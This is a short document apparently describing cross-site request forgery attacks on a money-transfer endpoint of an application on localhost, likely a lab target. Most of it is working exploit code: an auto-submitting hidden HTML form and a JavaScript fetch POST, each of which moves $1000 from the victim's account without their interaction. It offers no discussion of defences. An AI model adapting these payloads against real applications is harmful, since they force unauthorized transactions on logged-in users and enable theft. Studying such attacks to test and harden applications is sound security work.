CSRF Exploitation Payloads & Scenarios
Scenario 1: Hidden HTML Form with Auto-Submit
In this scenario, the attacker hosts a malicious website containing a hidden HTML form that targets the application's /transfer endpoint. When the victim visits the malicious page, JavaScript automatically submits the form, transferring the full balance ($1000) without victim interaction.

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit</title>
</head>
<body>
    <form id="csrfForm" action="http://localhost:8080/transfer" method="POST">
        <input type="hidden" name="amount" value="1000" />
    </form>
    <script>
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>

Scenario 2: Embedded Fetch Request / XHR Exploit
In this scenario, an attacker injects or executes a background JavaScript ⁠fetch⁠ request targeting the vulnerable endpoint. This can be hosted on a separate malicious site or executed via cross-site context.

fetch("http://localhost:8080/transfer", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "amount=1000"
})
.then(response => response.json())
.then(data => console.log(data));
